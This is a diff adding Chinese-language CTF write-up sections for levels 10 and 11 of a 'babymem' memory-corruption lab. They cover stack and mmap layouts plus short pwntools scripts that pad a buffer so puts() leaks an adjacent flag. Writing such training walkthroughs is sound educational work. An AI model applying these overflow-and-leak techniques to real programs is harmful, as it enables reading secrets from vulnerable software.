@@ -724,4 +724,79 @@ while True:
         exit()
 ```
 
-# level 10
+## level 10
+
+这一关，程序将`flag`文件的内容读取到了内存中，而且最后有`puts()`函数负责打印`buf`缓冲区中的内容，所以我们只需要填充flag具体内容之前的部分为`A`即可。注意不要发送`\x00`，这样`puts()`打印时，会将之前存储在`buf`中的`flag`一起打印出来。
+
+```asm
+
+-0x180 ---> &buffer
+-0x188 ---> &flag
+-0x180 ---> buf   输入的字符串
+
+
+
+-0x180 + 0x6B --> flag的具体内容
+
+0x000 ----> 旧的rbp指针  
+
+```
+
+
+```python
+from pwn import *
+
+elf = ELF("/challenge/babymem_level10.0")
+
+p = process("/challenge/babymem_level10.0")
+p.sendline("107")
+
+buffer_size = 107
+payload = buffer_size * b'A'
+p.send(payload)
+p.interactive()
+```
+
+## level 11
+
+这一关跟上一关一样。唯一不同的是，之前缓冲区是在栈空间上的，现在使用`mmap`(Memory Mapped File)将文件内容映射到进程的地址空间，从而可以像访问内存一样访问文件内容。通过这种方式，可以非常高效地对文件进行操作，特别适用于需要频繁读写大文件的场景。`mmap` 创建的内存映射区域可以被多个进程共享，所以当一个进程修改了映射区域的内容，其他进程可以立即看到这些修改。
+
+当一个进程多次调用` mmap `来创建内存映射区域时，每次调用都会在进程的虚拟地址空间中分配一个新的内存区域，并返回这个区域的起始地址。如果这些内存区域不被解除映射 `(munmap)`，它们将一直存在于进程的地址空间中，直到进程结束。
+
+
+另外，如果你要求的大小小于0x1000(4096)，通常，mmap 分配的地址会满足页面对齐要求（例如，4KB 页对齐）。所以它可能还是会分配0x1000的大小。
+
+```c
+ for ( i = 0; i <= 6; ++i )
+    v7 = mmap(0LL, 0x1000uLL, 3, 34, 0, 0LL);
+  buf = mmap(0LL, 0x11uLL, 3, 34, 0, 0LL); // 这里buf的大小还是0x1000
+```
+
+```asm
+Called mmap(0, 0x1000, 4, MAP_SHARED, open("/flag", 0), 0) = 0x7f795e195000
+Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7f795e194000
+Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7f795e193000
+Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7f795e192000
+Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7f795e191000
+Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7f795e190000
+Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7f795e18f000
+Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7f795e18e000
+Memory mapping the input buffer...
+Called mmap(0, 82, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = 0x7f795e18d000
+```
+
+所以只需要把payload设置成0x1000*8就行。
+
+```python
+from pwn import *
+
+elf = ELF("/challenge/babymem_level11.0")
+p = process("/challenge/babymem_level11.0")
+buffer_size = 0x1000 * 8
+p.sendline(f"{buffer_size}")
+payload = buffer_size * "A"
+p.send(payload)
+p.interactive()
+```
+
+## level 12
